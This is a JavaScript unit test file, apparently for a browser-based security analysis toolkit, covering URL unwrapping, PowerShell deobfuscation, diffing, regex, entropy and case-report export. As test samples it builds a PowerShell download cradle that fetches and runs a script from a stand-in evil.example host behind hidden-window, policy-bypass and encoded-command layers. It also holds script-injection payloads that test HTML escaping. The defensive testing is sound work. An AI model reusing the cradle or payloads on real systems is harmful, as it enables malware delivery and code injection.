/*
 * Unit tests for the "Later" modules' libraries: url, psdeobf, diff, regex,
 * entropy, casereport. Malicious-looking samples are assembled at runtime so
 * this file itself does not contain antivirus signature strings.
 */
(function () {
  'use strict';
  const { url: U, psdeobf: P, diff: D, regex: R, entropy: E, casereport: CR, codecs: C } = globalThis.OAT;
  const k = (...p) => p.join('');
  const json = (v) => JSON.stringify(v);

  // ------------------------------------------------------------ URL Analyzer

  test('URL: punycode decoding (RFC 3492 samples)', () => {
    assert.equal(U.punycodeDecode('mnchen-3ya'), 'münchen');
    assert.equal(U.punycodeDecode('80ak6aa92e'), 'аррӏе');
    assert.equal(U.toUnicodeHost('xn--80ak6aa92e.com'), 'аррӏе.com');
    assert.equal(U.skeleton('аррӏе.com'), 'apple.com');
  });

  test('URL: parts and query parameters', () => {
    const l = U.analyze('https://user:pw@example.com:8443/a%20b/c.php?x=1&y=two#frag').layers[0];
    assert.equal(l.parts.host, 'example.com');
    assert.equal(l.parts.port, '8443');
    assert.equal(l.parts.path, '/a b/c.php');
    assert.equal(json(l.parts.query), json([{ key: 'x', value: '1' }, { key: 'y', value: 'two' }]));
    assert.equal(l.parts.password, '(present)');
    assert.ok(l.findings.some((f) => f.level === 'high' && /username, not the site/.test(f.text)));
  });

  test('URL: SafeLinks wrapping a Google redirect wrapping the target', () => {
    const inner = 'https://www.google.com/url?q=https%3A%2F%2Fevil.example%2Flogin&sa=D';
    const safelink = `https://eur01.safelinks.protection.outlook.com/?url=${encodeURIComponent(inner)}&data=05%7C01&reserved=0`;
    const r = U.analyze(safelink);
    assert.equal(json(r.layers.map((l) => l.via)), json(['input', 'Microsoft Defender SafeLinks', 'Google redirect']));
    assert.equal(r.final.url, 'https://evil.example/login');
  });

  test('URL: Proofpoint v2 and v3', () => {
    const v2 = 'https://urldefense.proofpoint.com/v2/url?u=https-3A__evil.example_path-3Fa-3D1&d=DwMF&c=x';
    assert.equal(U.analyze(v2).final.url, 'https://evil.example/path?a=1');
    // v3: "*" placeholders are stored Base64URL-encoded after "__;". Here "*" stands for "?" ("Pw").
    const v3 = 'https://urldefense.com/v3/__https://evil.example/login*id=7__;Pw!!ABC!xyz$';
    assert.equal(U.analyze(v3).final.url, 'https://evil.example/login?id=7');
  });

  test('URL: generic and Base64 redirect parameters', () => {
    assert.equal(U.analyze('https://track.example.net/click?redirect=https://evil.example/x').final.url, 'https://evil.example/x');
    const b64 = C.base64Encode(C.utf8('https://evil.example/b64'));
    assert.equal(U.analyze(`https://t.example.org/r?url=${b64}`).final.url, 'https://evil.example/b64');
  });

  test('URL: obfuscated IP, defanged input, shortener and risky file', () => {
    const ip = U.analyze('http://0x7f.0.0.1/admin').layers[0];
    assert.equal(ip.parts.host, '127.0.0.1');
    assert.ok(ip.findings.some((f) => /Obfuscated IP address: "0x7f.0.0.1" is 127.0.0.1/.test(f.text)));
    const dec = U.analyze('http://3232235777/').layers[0];
    assert.equal(dec.parts.host, '192.168.1.1');
    assert.equal(U.analyze('hxxps://evil[.]example/a').layers[0].parts.host, 'evil.example');
    assert.ok(U.analyze('https://bit.ly/abc').layers[0].findings.some((f) => /shortener/.test(f.text)));
    assert.ok(U.analyze('https://cdn.example.com/files/invoice.pdf.exe').layers[0].findings.some((f) => /risky file type/.test(f.text)));
  });

  test('URL: look-alike domain is flagged with its skeleton', () => {
    const f = U.analyze('https://xn--80ak6aa92e.com/').layers[0].findings.map((x) => x.text).join('\n');
    assert.ok(/displays as "аррӏе.com" and looks like "apple.com"/.test(f), f);
    assert.throws(() => U.analyze('http://exa mple.com'), /valid URL/);
  });

  // ------------------------------------------------------------ PowerShell

  const enc = (s) => C.base64Encode(C.utf16leEncode(s));

  test('PS: -EncodedCommand in its abbreviations', () => {
    for (const sw of ['-e', '-ec', '-en', '-enc', '-EncodedCommand', '/enc', '-ENCODEDCOMM']) {
      const r = P.deobfuscate(`powershell.exe -nop ${sw} ${enc("Write-Host 'hi'")}`);
      assert.equal(r.final, "Write-Host 'hi'", sw);
    }
  });

  test('PS: backticks, concatenation, format operator, char codes', () => {
    assert.equal(P.clean('W`ri`te-H`ost "a`tb"'), "Write-Host \"a`tb\"");
    assert.equal(P.clean("('Wri'+'te-'+\"Host\") 'x'"), "'Write-Host' 'x'");
    assert.equal(P.clean("& (\"{1}{0}\" -f 'Host','Write-') 'x'"), "Write-Host 'x'");
    assert.equal(P.clean('([char]87+[char]0x72+[char](105))'), "'Wri'");
    assert.equal(P.clean("[char[]](72,105) -join ''"), "'Hi'");
  });

  test('PS: replace, -replace, reversed strings, GetString/FromBase64String', () => {
    assert.equal(P.clean("'WXrite'.Replace('X','')"), "'Write'");
    assert.equal(P.clean("'W##rite' -replace '#',''"), "'Write'");
    assert.equal(P.clean("-join 'tsoH-etirW'[-1..-10]"), "'Write-Host'");
    const b64 = C.base64Encode(C.utf16leEncode('hello'));
    assert.equal(P.clean(`[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${b64}'))`), "'hello'");
  });

  test('PS: nested layers and findings for a download cradle', () => {
    const cradle = k('I', 'EX (New-Object Net.Web', 'Client).Down', "loadString('http://evil.example/a.ps1')");
    const inner = `powershell -w hidden -ep bypass -enc ${enc(cradle)}`;
    const r = P.deobfuscate(`cmd /c powershell -nop -enc ${enc(inner)}`);
    assert.equal(r.final, cradle.replace(k('Net.Web', 'Client'), k('Net.', 'WebClient')));
    assert.ok(r.layers.filter((l) => /EncodedCommand decoded/.test(l.title)).length === 2, 'two encoded layers');
    const f = r.findings.map((x) => `${x.level}: ${x.text}`).join('\n');
    assert.ok(/high: Invoke-Expression/.test(f) && /high: Downloads content/.test(f) && /medium: Hidden window/.test(f) && /medium: Execution policy bypass/.test(f), f);
    assert.ok(r.iocs.some((x) => x.value === 'http://evil.example/a.ps1'), 'URL IOC');
  });

  test('PS: gzip-compressed payload is decompressed (async)', async () => {
    if (typeof CompressionStream !== 'function') return;
    const script = "Write-Host 'from gzip'";
    const gz = new Uint8Array(await new Response(new Blob([C.utf8(script)]).stream().pipeThrough(new CompressionStream('gzip'))).arrayBuffer());
    const wrapper = `$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('${C.base64Encode(gz)}'));` +
      `(New-Object IO.StreamReader(New-Object ${k('IO.Compression.', 'GzipStream')}($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()`;
    const r = await P.deobfuscateAll(wrapper);
    assert.ok(r.layers.some((l) => /Decompressed gzip/.test(l.title)), 'decompressed layer');
    assert.equal(r.final, script);
  });

  test('PS: plain text is left alone and never executed', () => {
    const r = P.deobfuscate('Get-Process | Sort-Object CPU');
    assert.equal(r.final, 'Get-Process | Sort-Object CPU');
    assert.equal(r.findings.length, 0);
  });

  // ------------------------------------------------------------ Diff

  test('Diff: Myers edit script on lines', () => {
    const r = D.diffText('a\nb\nc\nd\n', 'a\nx\nc\nd\ne\n');
    assert.equal(r.added, 2);
    assert.equal(r.removed, 1);
    assert.equal(r.ops.map((o) => o.op).join(''), '=-+==+');
  });

  test('Diff: classic ABCABBA / CBABAC has edit distance 5', () => {
    const ops = D.myers([...'ABCABBA'], [...'CBABAC']);
    assert.equal(ops.filter((o) => o.op !== '=').length, 5);
    // Applying the script reproduces b.
    const b = ops.filter((o) => o.op !== '-').map((o) => (o.op === '+' ? 'CBABAC'[o.b] : 'ABCABBA'[o.a])).join('');
    assert.equal(b, 'CBABAC');
  });

  test('Diff: ignore whitespace and case', () => {
    assert.equal(D.diffText('Hello  World', 'hello world', { ignoreWhitespace: true, ignoreCase: true }).added, 0);
    assert.equal(D.diffText('Hello  World', 'hello world').added, 1);
  });

  test('Diff: unified output with hunk headers', () => {
    const left = Array.from({ length: 20 }, (_, i) => `line ${i + 1}`).join('\n');
    const right = left.replace('line 10', 'line ten');
    assert.equal(D.unified(D.diffText(left, right), { nameA: 'old', nameB: 'new' }),
      '--- old\n+++ new\n@@ -7,7 +7,7 @@\n line 7\n line 8\n line 9\n-line 10\n+line ten\n line 11\n line 12\n line 13\n');
    assert.equal(D.unified(D.diffText('same', 'same')), '');
  });

  test('Diff: side-by-side pairing and word diff', () => {
    const rows = D.sideBySide(D.diffText('a\nold line\nc', 'a\nnew line\nc'));
    assert.equal(rows.map((r) => r.type).join(), 'equal,change,equal');
    assert.equal(json(D.wordDiff('set x = 1', 'set x = 2')), json([{ op: '=', text: 'set x = ' }, { op: '-', text: '1' }, { op: '+', text: '2' }]));
  });

  // ------------------------------------------------------------ Regex

  test('Regex: matches, groups and named groups', () => {
    const r = R.run('(?<user>\\w+)@(\\w+)\\.com', 'g', 'a@b.com, c@d.com');
    assert.equal(r.matches.length, 2);
    assert.equal(r.matches[1].named.user, 'c');
    assert.equal(r.matches[1].groups[1], 'd');
    assert.equal(r.matches[0].index, 0);
  });

  test('Regex: non-global finds one; empty matches do not loop; replace', () => {
    assert.equal(R.run('\\d', '', 'a1b2').matches.length, 1);
    assert.equal(R.run('x*', 'g', 'abc').matches.length, 4);
    assert.equal(R.run('😀|', 'gu', 'a😀b').matches.length, 4);
    assert.equal(R.run('(\\d+)', 'g', 'a1b22', { replacement: '[$1]' }).replaced, 'a[1]b[22]');
    assert.ok(/Invalid|Unterminated|Nothing/.test(R.run('(', 'g', 'x').error));
  });

  test('Regex: presets compile and match their examples', () => {
    const samples = { 'IPv4 address': '8.8.8.8', 'Windows SID': 'S-1-5-21-1004336348-1177238915-682003330-512', 'GUID': '0f8fad5b-d9cb-469f-a165-70867728950e', 'Registry key': 'HKLM\\Software\\Run' };
    for (const p of R.PRESETS) {
      new RegExp(p.pattern, p.flags);
      if (samples[p.name]) assert.equal(R.run(p.pattern, p.flags, samples[p.name]).matches.length, 1, p.name);
    }
  });

  // ------------------------------------------------------------ Entropy / strings

  test('Entropy: known values', () => {
    assert.equal(E.shannon(new Uint8Array(1000)), 0);
    assert.equal(E.shannon(Uint8Array.from({ length: 256 }, (_, i) => i)), 8);
    assert.equal(E.shannon(C.utf8('abab')), 1);
    assert.equal(E.shannonText('aaaa'), 0);
    assert.ok(/very high/.test(E.verdict(7.9)) && /low: plain/.test(E.verdict(4)));
  });

  test('Entropy: block profile', () => {
    const data = new Uint8Array(2048);
    for (let i = 1024; i < 2048; i++) data[i] = i & 255;
    assert.equal(json(E.blocks(data, 1024)), json([0, 8]));
  });

  test('Strings: ASCII and UTF-16LE with offsets', () => {
    const bytes = new Uint8Array([0, 0, ...C.utf8('hello world'), 0, 1, 2, ...C.utf16leEncode('wide text'), 0, 0, ...C.utf8('ab')]);
    const { strings } = E.strings(bytes, { min: 4 });
    assert.equal(json(strings.map((s) => [s.offset, s.enc, s.text])), json([[2, 'ascii', 'hello world'], [16, 'utf16le', 'wide text']]));
  });

  test('Strings: interesting markers', () => {
    assert.equal(E.interesting('http://evil.example/x'), 'URL');
    assert.equal(E.interesting(k('Virtual', 'AllocEx')), 'suspicious API');
    assert.equal(E.interesting('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'), 'registry');
    assert.equal(E.interesting('C:\\build\\x\\release\\app.pdb'), 'debug path');
    assert.equal(E.interesting('just some words'), null);
  });

  test('Per-line entropy ranks random-looking domains first', () => {
    const r = E.perLine('google.com\nxj4kq9zt2vbn7w.top\nmail.example.org');
    assert.equal(r[0].line, 'xj4kq9zt2vbn7w.top');
  });

  // ------------------------------------------------------------ Case report

  test('Case: add IOCs, dedupe, verdicts survive JSON round trip', () => {
    const c = CR.emptyCase(new Date('2026-10-07T10:00:00Z'));
    c.title = 'Phish <b>wave</b>';
    assert.equal(CR.addIocsFromText(c, 'hxxps://evil-site[.]com/x and 8.8.8.8'), 3);
    assert.equal(CR.addIocsFromText(c, '8.8.8.8 again'), 0);
    c.iocs[0].verdict = 'malicious';
    c.timeline.push({ time: '2026-10-07T09:00', text: 'User clicked | link' });
    const back = CR.fromJson(CR.toJson(c));
    assert.equal(back.iocs.length, 3);
    assert.equal(back.iocs[0].verdict, 'malicious');
    assert.equal(back.title, 'Phish <b>wave</b>');
  });

  test('Case: imported JSON is sanitised', () => {
    const c = CR.fromJson({ title: 42, iocs: [{ value: 'x.com', verdict: 'evil', type: 'domain' }, { value: '' }, 'junk'], timeline: 'no', notes: 'n' });
    assert.equal(c.title, '');
    assert.equal(c.iocs.length, 1);
    assert.equal(c.iocs[0].verdict, 'unknown');
    assert.equal(c.timeline.length, 0);
    assert.throws(() => CR.fromJson('null'), /Not a case/);
  });

  test('Case: Markdown and HTML exports escape and defang', () => {
    const c = CR.emptyCase();
    c.title = 'Case <script>alert(1)</script>';
    CR.addIocsFromText(c, 'https://evil.example/a');
    c.iocs[0].note = '<img src=x onerror=alert(1)> | split';
    const html = CR.toHtml(c);
    assert.ok(!html.includes('<script>alert') && !html.includes('<img src=x'), 'html escaped');
    assert.ok(html.includes('hxxps[://]evil[.]example'), 'defanged in html');
    assert.ok(html.includes("default-src 'none'"), 'report has a CSP');
    const md = CR.toMarkdown(c);
    assert.ok(md.includes('hxxps[://]evil[.]example/a'), md);
    assert.ok(!md.includes('<script>') && !md.includes('<img'), 'markdown escapes raw HTML');
    assert.ok(md.includes('&lt;img src=x onerror=alert(1)&gt; \\| split'), 'pipes escaped in table cells');
    assert.ok(CR.toMarkdown(c, { defang: false }).includes('https://evil.example'), 'defang off');
  });
})();
